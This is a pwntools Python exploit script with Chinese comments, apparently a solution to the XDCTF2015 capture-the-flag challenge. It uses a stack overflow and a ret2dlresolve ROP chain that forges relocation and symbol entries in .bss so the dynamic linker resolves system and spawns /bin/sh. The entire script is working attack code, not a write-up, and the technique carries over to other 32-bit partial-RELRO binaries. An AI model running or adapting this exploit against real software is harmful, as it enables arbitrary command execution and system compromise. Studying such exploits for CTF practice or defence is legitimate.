from pwn import *
context(log_level='debug')
elf = ELF('partial_relro_32')
io = process(elf.path)
rop = ROP('partial_relro_32')

fake_rel_addr = bss_blank_addr = 0x0804A050

# 准备构造fake Elf32_Rel(dynsym表项)-计算偏移
fake_sym_addr = bss_blank_addr + 8
sym_table_addr = 0x080481D8
sizeof_sym = 0x10
fake_sym_table_idx = (((fake_sym_addr-sym_table_addr)//sizeof_sym) <<8) + 7
# 准备构造fake Elf32_Sym(dynstr表项)-计算偏移
str_table_addr = 0x08048278
system_addr = fake_sym_addr + 0x10
bin_sh_addr = system_addr + 7
fake_str_offset = system_addr - str_table_addr


# 构造fake Elf32_Rel
read_got_addr = elf.got['read']
fake_Elf32_Rel = p32(read_got_addr)
fake_Elf32_Rel += p32(fake_sym_table_idx)

# 构造fake Elf32_Sym
fake_Elf32_Sym = p32(fake_str_offset)
fake_Elf32_Sym += p32(0)
fake_Elf32_Sym += p32(0)
fake_Elf32_Sym += p8(0x12) + p8(0) + p16(0)

strings_system_bin_sh = b"system\x00/bin/sh\x00"

# resolve的PLT，push link_map的位置
dyn_resolve_plt_addr = 0x08048380
# fake rel表项的偏移
rel_addr = 0x08048330 
fake_rel_offset = fake_rel_addr - rel_addr

fake_data = fake_Elf32_Rel + fake_Elf32_Sym + strings_system_bin_sh

payload = flat(['a'*0x6c+'bbbb'])
rop.raw(payload)
rop.read(0,bss_blank_addr,len(fake_data))
rop.raw(p32(dyn_resolve_plt_addr))
rop.raw(p32(fake_rel_offset))
rop.raw('cccc')
rop.raw(p32(bin_sh_addr))

io.recvuntil('Welcome to XDCTF2015~!')
io.send(rop.chain())
io.send(fake_data)
io.interactive()
